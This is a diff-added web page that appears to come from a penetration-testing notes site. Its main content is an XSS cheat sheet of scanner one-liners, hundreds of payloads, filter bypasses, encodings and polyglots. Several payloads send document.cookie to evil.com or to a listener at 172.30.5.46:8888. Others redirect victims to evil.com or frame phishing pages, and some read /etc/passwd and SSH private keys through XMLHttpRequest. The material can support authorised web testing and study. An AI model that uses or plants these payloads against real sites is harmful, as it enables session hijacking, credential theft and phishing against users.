+      <a href="../../../exploitation/reverse_shells/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Reverse Shells
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../exploitation/file_transfer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File Transfer
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Code Execution
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            Code Execution
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../exploitation/code_execution/linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux Snippets
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../exploitation/code_execution/windows/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows Snippets
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../exploitation/code_execution/web/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Snippets
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Post Exploitation
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Post Exploitation
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post_exploitation/linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post_exploitation/windows/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../oscp_tips/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OSCP Tips
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../about/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    About
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="xss">XSS</h1>
+<h2 id="xss-cheat-sheet">XSS Cheat Sheet</h2>
+<h3 id="xss-cheat-sheet-reference">XSS Cheat Sheet Reference</h3>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank">Cross-Site Scripting (XSS) Cheat Sheet</a></p>
+<p>!!! info "XSS Testing Best Practices"
+    - Try XSS in every input field, host headers, URL redirections, URI parameters, and file upload name fields.
+    - Actions:
+      - Phishing through <code>&lt;iframe&gt;</code>.
+      - Cookie stealing using <code>document.cookie</code>.
+      - Self-conversion to reflected XSS when possible.</p>
+<h2 id="tools">Tools</h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># https://github.com/hahwul/dalfox</span>
+dalfox<span class="w"> </span>url<span class="w"> </span>http://testphp.vulnweb.com/listproducts.php
+
+<span class="c1"># https://github.com/KathanP19/Gxss</span>
+<span class="c1"># Replace every param value with word FUZZ</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;https://target.com/some.php?first=hello&amp;last=world&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Gxss<span class="w"> </span>-c<span class="w"> </span><span class="m">100</span>
+
+<span class="c1"># XSpear</span>
+gem<span class="w"> </span>install<span class="w"> </span>XSpear
+XSpear<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;https://web.com&#39;</span><span class="w"> </span>-a
+XSpear<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;https://www.web.com/?q=123&#39;</span><span class="w"> </span>--cookie<span class="o">=</span><span class="s1">&#39;role=admin&#39;</span><span class="w"> </span>-v<span class="w"> </span><span class="m">1</span><span class="w"> </span>-a<span class="w"> </span>-b<span class="w"> </span>https://six2dez.xss.ht<span class="w"> </span>-t<span class="w"> </span><span class="m">20</span>
+XSpear<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://testphp.vulnweb.com/search.php?test=query&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="nb">test</span><span class="w"> </span>-v<span class="w"> </span><span class="m">1</span>
+
+<span class="c1"># Xira</span>
+<span class="c1"># https://github.com/xadhrit/xira</span>
+python3<span class="w"> </span>xira.py<span class="w"> </span>-u<span class="w"> </span>url
+
+<span class="c1"># Hosting XSS</span>
+<span class="c1"># surge.sh</span>
+npm<span class="w"> </span>install<span class="w"> </span>--global<span class="w"> </span>surge
+mkdir<span class="w"> </span>mypayload
+<span class="nb">cd</span><span class="w"> </span>mypayload
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;alert(1)&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>payload.js
+surge<span class="w"> </span><span class="c1"># It returns the url</span>
+
+<span class="c1"># XSS vectors</span>
+https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45
+
+<span class="c1"># Payload list</span>
+https://github.com/m0chan/BugBounty/blob/master/xss-payload-list.txt
+
+https://github.com/terjanq/Tiny-XSS-Payloads
+
+<span class="c1"># XSS to RCE</span>
+<span class="c1"># https://github.com/shelld3v/JSshell</span>
+
+<span class="c1"># Polyglots</span>
+<span class="c1"># https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot</span>
+
+<span class="c1"># XSS browser</span>
+<span class="c1"># https://github.com/RenwaX23/XSSTRON</span>
+
+<span class="c1"># Blind</span>
+<span class="c1"># https://github.com/hipotermia/vaya-ciego-nen</span>
+</code></pre></div>
+<h3 id="oneliners">Oneliners</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># WaybackUrls</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;domain.com&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>waybackurls<span class="w"> </span><span class="p">|</span><span class="w"> </span>httpx<span class="w"> </span>-silent<span class="w"> </span><span class="p">|</span><span class="w"> </span>Gxss<span class="w"> </span>-c<span class="w"> </span><span class="m">100</span><span class="w"> </span>-p<span class="w"> </span>Xss<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u<span class="w"> </span><span class="p">|</span><span class="w"> </span>dalfox<span class="w"> </span>pipe<span class="w"> </span>-b<span class="w"> </span>https://six2dez.xss.ht
+<span class="c1"># Param discovery based</span>
+paramspider<span class="w"> </span>-d<span class="w"> </span>target.com<span class="w"> </span>&gt;<span class="w"> </span>/filepath/param.txt<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>dalfox<span class="w"> </span>-b<span class="w"> </span>https://six2dez.xss.ht<span class="w"> </span>file<span class="w"> </span>/filepath/param.txt<span class="w"> </span>
+<span class="c1"># Blind XSS</span>
+cat<span class="w"> </span>target_list.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>waybackurls<span class="w"> </span>-no-subs<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;https://&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;png\|jpg\|css\|js\|gif\|txt&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;=&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>qsreplace<span class="w"> </span>-a<span class="w"> </span><span class="p">|</span><span class="w"> </span>dalfox<span class="w"> </span>pipe<span class="w"> </span>-b<span class="w"> </span>https://six2dez.xss.ht
+<span class="c1"># Reflected XSS</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;domain.com&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>waybackurls<span class="w"> </span><span class="p">|</span><span class="w"> </span>gf<span class="w"> </span>xss<span class="w"> </span><span class="p">|</span><span class="w"> </span>kxss
+</code></pre></div>
+<h2 id="xss-recopilation">XSS recopilation</h2>
+<h3 id="basics">Basics</h3>
+<div class="highlight"><pre><span></span><code># Locators
+&#39;&#39;;!--&quot;&lt;XSS&gt;=&amp;{()}
+
+# 101
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;
+&lt;script&gt;+-+-1-+-+alert(/xss/)&lt;/script&gt;
+%3Cscript%3Ealert(0)%3C%2Fscript%3E
+%253Cscript%253Ealert(0)%253C%252Fscript%253E
+&lt;svg onload=alert(1)&gt;
+&quot;&gt;&lt;svg onload=alert(1)&gt;
+&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;
+&quot;&gt;&lt;script src=data:&amp;comma;alert(1)//
+&lt;noscript&gt;&lt;p title=&quot;&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;&quot;&gt;
+%5B&#39;-alert(document.cookie)-&#39;%5D
+</code></pre></div>
+<h3 id="by-tag">By tag</h3>
+<div class="highlight"><pre><span></span><code># Tag filter bypass
+&lt;svg/onload=alert(1)&gt;
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script     &gt;alert(1)&lt;/script&gt;
+&lt;ScRipT&gt;alert(1)&lt;/sCriPt&gt;
+&lt;%00script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;al%00ert(1)&lt;/script&gt;
+
+# HTML tags
+&lt;img/src=x a=&#39;&#39; onerror=alert(1)&gt;
+&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;&quot;&gt;
+&lt;img src=`x`onerror=alert(1)&gt;
+&lt;img src=&#39;/&#39; onerror=&#39;alert(&quot;kalisa&quot;)&#39;&gt;
+&lt;IMG SRC=# onmouseover=&quot;alert(&#39;xxs&#39;)&quot;&gt;
+&lt;IMG SRC= onmouseover=&quot;alert(&#39;xxs&#39;)&quot;&gt;
+&lt;IMG onmouseover=&quot;alert(&#39;xxs&#39;)&quot;&gt;
+&lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt;
+&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;
+&lt;SCRIPT SRC=http:/evil.com/xss.js?&lt; B &gt;
+&quot;&gt;&lt;XSS&lt;test accesskey=x onclick=alert(1)//test
+&lt;svg&gt;&lt;discard onbegin=alert(1)&gt;
+&lt;script&gt;image = new Image(); image.src=&quot;https://evil.com/?c=&quot;+document.cookie;&lt;/script&gt;
+&lt;script&gt;image = new Image(); image.src=&quot;http://&quot;+document.cookie+&quot;evil.com/&quot;;&lt;/script&gt;
+
+# Other tags
+&lt;BASE HREF=&quot;javascript:alert(&#39;XSS&#39;);//&quot;&gt;
+&lt;DIV STYLE=&quot;width: expression(alert(&#39;XSS&#39;));&quot;&gt;
+&lt;TABLE BACKGROUND=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;
+&lt;IFRAME SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;/IFRAME&gt;
+&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;
+&lt;xss id=x tabindex=1 onactivate=alert(1)&gt;&lt;/xss&gt;
+&lt;xss onclick=&quot;alert(1)&quot;&gt;test&lt;/xss&gt;
+&lt;xss onmousedown=&quot;alert(1)&quot;&gt;test&lt;/xss&gt;
+&lt;body onresize=alert(1)&gt;”onload=this.style.width=‘100px’&gt;
+&lt;xss id=x onfocus=alert(document.cookie)tabindex=1&gt;#x’;&lt;/script&gt;
+
+# CharCode
+&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
+
+# Input already in script tag
+@domain.com&quot;&gt;user+&#39;-alert`1`-&#39;@domain.com
+
+# Scriptless
+&lt;link rel=icon href=&quot;//evil?
+&lt;iframe src=&quot;//evil?
+&lt;iframe src=&quot;//evil?
+&lt;input type=hidden type=image src=&quot;//evil?
+
+# Unclosed Tags
+&lt;svg onload=alert(1)//
+</code></pre></div>
+<h3 id="blind">Blind</h3>
+<div class="highlight"><pre><span></span><code># Blind XSS
+# https://github.com/LewisArdern/bXSS
+# https://github.com/ssl/ezXSS
+# https://xsshunter.com/
+
+# Blind XSS detection
+# Xsshunter payload in every field
+# Review forms
+# Contact Us pages
+# Passwords(You never know if the other side doesn’t properly handle input and if your password is in View mode)
+# Address fields of e-commerce sites
+# First or Last Name field while doing Credit Card Payments
+# Set User-Agent to a Blind XSS payload. You can do that easily from a proxy such as Burpsuite.
+# Log Viewers
+# Feedback Page
+# Chat Applications
+# Any app that requires user moderation
+# Host header
+# Why cancel subscription? forms
+</code></pre></div>
+<h3 id="bypasses">Bypasses</h3>
+<div class="highlight"><pre><span></span><code># No parentheses
+&lt;script&gt;onerror=alert;throw 1&lt;/script&gt;
+&lt;script&gt;throw onerror=eval,&#39;=alert\x281\x29&#39;&lt;/script&gt;
+&lt;script&gt;&#39;alert\x281\x29&#39;instanceof{[Symbol.hasInstance]:eval}&lt;/script&gt;
+&lt;script&gt;location=&#39;javascript:alert\x281\x29&#39;&lt;/script&gt;
+&lt;script&gt;alert`1`&lt;/script&gt;
+&lt;script&gt;new Function`X${document.location.hash.substr`1`}`&lt;/script&gt;
+
+# No parentheses and no semicolons
+&lt;script&gt;{onerror=alert}throw 1&lt;/script&gt;
+&lt;script&gt;throw onerror=alert,1&lt;/script&gt;
+&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;
+&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;
+&lt;script&gt;throw onerror=alert,&#39;some string&#39;,123,&#39;haha&#39;&lt;/script&gt;
+
+# No parentheses and no spaces:
+&lt;script&gt;Function`X${document.location.hash.substr`1`}```&lt;/script&gt;
+
+# Angle brackets HTML encoded (in an attribute)
+“onmouseover=“alert(1)
+‘-alert(1)-’
+
+# If quote is escaped
+‘}alert(1);{‘
+‘}alert(1)%0A{‘
+\’}alert(1);{//
+
+# Embedded tab, newline, carriage return to break up XSS
+&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&#39;XSS&#39;);&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&#39;XSS&#39;);&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&#39;XSS&#39;);&quot;&gt;
+
+# RegEx bypass
+&lt;img src=&quot;X&quot; onerror=top[8680439..toString(30)](1337)&gt;
+
+# Other
+&lt;svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))&gt;: base64 value which is alert(‘XSS’)
+</code></pre></div>
+<h3 id="encoded">Encoded</h3>
+<div class="highlight"><pre><span></span><code># Unicode
+&lt;script&gt;\u0061lert(1)&lt;/script&gt;
+&lt;script&gt;\u{61}lert(1)&lt;/script&gt;
+&lt;script&gt;\u{0000000061}lert(1)&lt;/script&gt;
+
+# Hex
+&lt;script&gt;eval(&#39;\x61lert(1)&#39;)&lt;/script&gt;
+
+# HTML
+&lt;svg&gt;&lt;script&gt;&amp;#97;lert(1)&lt;/script&gt;&lt;/svg&gt;
+&lt;svg&gt;&lt;script&gt;&amp;#x61;lert(1)&lt;/script&gt;&lt;/svg&gt;
+&lt;svg&gt;&lt;script&gt;alert&amp;NewLine;(1)&lt;/script&gt;&lt;/svg&gt;
+&lt;svg&gt;&lt;script&gt;x=&quot;&amp;quot;,alert(1)//&quot;;&lt;/script&gt;&lt;/svg&gt;
+\’-alert(1)//
+
+# URL
+&lt;a href=&quot;javascript:x=&#39;%27-alert(1)-%27&#39;;&quot;&gt;XSS&lt;/a&gt;
+
+# Double URL Encode
+%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+
+# Unicode + HTML
+&lt;svg&gt;&lt;script&gt;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x31;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x63;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x35;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x32;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x34;(1)&lt;/script&gt;&lt;/svg&gt;
+
+# HTML + URL
+&lt;iframe src=&quot;javascript:&#39;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x25;&amp;#x33;&amp;#x45;&#39;&quot;&gt;&lt;/iframe&gt;
+</code></pre></div>
+<h3 id="polyglots">Polyglots</h3>
+<div class="highlight"><pre><span></span><code>jaVasCript:/*-/*`/*\`/*&#39;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
+--&gt;&#39;&quot;/&gt;&lt;/sCript&gt;&lt;deTailS open x=&quot;&gt;&quot; ontoggle=(co\u006efirm)``&gt;
+oNcliCk=alert(1)%20)//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;%5Cx3csVg/&lt;img/src/onerror=alert(2)&gt;%5Cx3e
+javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload=&#39;+/&quot;/+/onmouseover=1/+/[*/[]/+alert(document.domain)//&#39;&gt;
+javascript:alert();//&lt;img src=x:x onerror=alert(1)&gt;\&quot;;alert();//&quot;;alert();//&#39;;alert();//`;alert();// alert();//*/alert();//--&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/noscript&gt;&lt;/noembed&gt;&lt;/template&gt;&lt;/select&gt;&lt;/script&gt;&lt;frame src=javascript:alert()&gt;&lt;svg onload=alert()&gt;&lt;!--
+&#39;;alert(String.fromCharCode(88,83,83))//&#39;;alert(String. fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode (88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//-- &gt;&lt;/SCRIPT&gt;&quot;&gt;&#39;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83)) &lt;/SCRIPT&gt;
+&quot;&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;&quot; &gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1) &gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;&#39;--&gt;&quot; &gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;img/id=&quot;confirm&amp;lpar; 1)&quot;/alt=&quot;/&quot;src=&quot;/&quot;onerror=eval(id&amp;%23x29;&gt;&#39;&quot;&gt;&lt;img src=&quot;http: //i.imgur.com/P8mL8.jpg&quot;&gt; 
+￼￼```
+%3C!%27/!%22/!\%27/\%22/ — !%3E%3C/Title/%3C/script/%3E%3CInput%20Type=Text%20Style=position:fixed;top:0;left:0;font-size:999px%20*/;%20Onmouseenter=confirm1%20//%3E#
+&lt;!&#39;/!”/!\&#39;/\&quot;/ — !&gt;&lt;/Title/&lt;/script/&gt;&lt;Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm1 //&gt;#
+jaVasCript:/-//*\/&#39;/&quot;/*/(/ */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/ — !&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
+&quot;&gt;&gt;
+” &gt;&lt;/plaintext&gt;&lt;/|&gt;&lt;plaintext/onmouseover=prompt(1) &gt;prompt(1)@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;’ →” &gt; &quot;&gt;&lt;/script&gt;alert(1)”&gt;&lt;img/id=&quot;confirm( 1)&quot;/alt=&quot;/&quot;src=&quot;/&quot;onerror=eval(id&amp;%23x29;&gt;&#39;&quot;&gt;&quot;&gt;
+&quot; onclick=alert(1)//&lt;button &#39; onclick=alert(1)//&gt; */ alert(1)//
+?msg=&lt;img/src=`%00`%20onerror=this.onerror=confirm(1)
+&lt;svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))&gt;
+&lt;sVg/oNloAd=”JaVaScRiPt:/**\/*\’/”\eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))”&gt; &lt;iframe src=jaVaScrIpT:eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))&gt;
+&#39;;alert(String.fromCharCode(88,83,83))//&#39;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#39;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+jaVasCript:/*-/*`/*\`/*&#39;/*&quot;/**/(/* */oNcliCk=alert())//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
+&#39;&quot;&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;&quot;&gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouse over=prompt(1)&gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;&#39;--&gt;&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;img/id=&quot;confirm&amp;lpar;1)&quot;/alt=&quot;/&quot;src=&quot;/&quot;onerror=eval(id&amp;%23x29;&gt;&#39;&quot;&gt;&lt;imgsrc=&quot;http://i.imgur.com/P8mL8.jpg&quot;&gt;
+
+# No parenthesis, back ticks, brackets, quotes, braces
+a=1337,b=confirm,c=window,c.onerror=b;throw-a
+
+# Another uncommon
+&#39;-(a=alert,b=&quot;_Y000!_&quot;,[b].find(a))-&#39;
+
+# Common XSS in HTML Injection
+&lt;svg onload=alert(1)&gt;
+&lt;/tag&gt;&lt;svg onload=alert(1)&gt;
+&quot;&gt;&lt;/tag&gt;&lt;svg onload=alert(1)&gt;
+&#39;onload=alert(1)&gt;&lt;svg/1=&#39;
+&#39;&gt;alert(1)&lt;/script&gt;&lt;script/1=&#39;
+*/alert(1)&lt;/script&gt;&lt;script&gt;/*
+*/alert(1)&quot;&gt;&#39;onload=&quot;/*&lt;svg/1=&#39;
+`-alert(1)&quot;&gt;&#39;onload=&quot;`&lt;svg/1=&#39;
+*/&lt;/script&gt;&#39;&gt;alert(1)/*&lt;script/1=&#39;
+p=&lt;svg/1=&#39;&amp;q=&#39;onload=alert(1)&gt;
+p=&lt;svg 1=&#39;&amp;q=&#39;onload=&#39;/*&amp;r=*/alert(1)&#39;&gt;
+q=&lt;script/&amp;q=/src=data:&amp;q=alert(1)&gt;
+&lt;script src=data:,alert(1)&gt;
+# inline
+&quot;onmouseover=alert(1) //
+&quot;autofocus onfocus=alert(1) //
+# src attribute
+javascript:alert(1)
+# JS injection
+&#39;-alert(1)-&#39;
+&#39;/alert(1)//
+\&#39;/alert(1)//
+&#39;}alert(1);{&#39;
+&#39;}alert(1)%0A{&#39;
+\&#39;}alert(1);{//
+/alert(1)//\
+/alert(1)}//\
+${alert(1)}
+
+# XSS onscroll
+&lt;p style=overflow:auto;font-size:999px onscroll=alert(1)&gt;AAA&lt;x/id=y&gt;&lt;/p&gt;#y
+
+# XSS filter bypasss polyglot:
+&#39;;alert(String.fromCharCode(88,83,83))//&#39;;alert(String. fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode (88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//-- &gt;&lt;/SCRIPT&gt;&quot;&gt;&#39;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83)) &lt;/SCRIPT&gt;
+&quot;&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;&quot; &gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1) &gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;&#39;--&gt;&quot; &gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;img/id=&quot;confirm&amp;lpar; 1)&quot;/alt=&quot;/&quot;src=&quot;/&quot;onerror=eval(id&amp;%23x29;&gt;&#39;&quot;&gt;&lt;img src=&quot;http: //i.imgur.com/P8mL8.jpg&quot;&gt; 
+
+&quot; &lt;script&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText.fontsize(1)) }; x.open(&quot;GET&quot;,&quot;file:///home/reader/.ssh/id_rsa&quot;); x.send(); &lt;/script&gt;
+&quot; &lt;script&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;); x.send(); &lt;/script&gt;
+
+# GO SSTI
+{{define &quot;T1&quot;}}&lt;script&gt;alert(1)&lt;/script&gt;{{end}} {{template &quot;T1&quot;}}`
+
+# Some XSS exploitations
+- host header injection through xss
+add referer: batman 
+hostheader: bing.com&quot;&gt;script&gt;alert(document.domain)&lt;/script&gt;&lt;&quot;
+- URL redirection through xss
+document.location.href=&quot;http://evil.com&quot;
+- phishing through xss - iframe injection
+&lt;iframe src=&quot;http://evil.com&quot; height=&quot;100&quot; width=&quot;100&quot;&gt;&lt;/iframe&gt;
+- Cookie stealing through xss
+https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py
+https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md
+&lt;script&gt;var i=new Image;i.src=&quot;http://172.30.5.46:8888/?&quot;+document.cookie;&lt;/script&gt;
+&lt;img src=x onerror=this.src=&#39;http://172.30.5.46:8888/?&#39;+document.cookie;&gt;
+&lt;img src=x onerror=&quot;this.src=&#39;http://172.30.5.46:8888/?&#39;+document.cookie; this.removeAttribute(&#39;onerror&#39;);&quot;&gt;
+-  file upload  through xss
+upload a picturefile, intercept it, change picturename.jpg to xss paylaod using intruder attack
+-  remote file inclusion (RFI) through xss
+php?=http://brutelogic.com.br/poc.svg - xsspayload
+- convert self xss to reflected one
+copy response in a file.html -&gt; it will work
+
+# XSS to SSRF
+&lt;esi:include src=&quot;http://yoursite.com/capture&quot; /&gt;
+
+# XSS to LFI
+&lt;script&gt;    x=new XMLHttpRequest;   x.onload=function(){        document.write(this.responseText)   };  x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;); x.send();&lt;/script&gt;
+
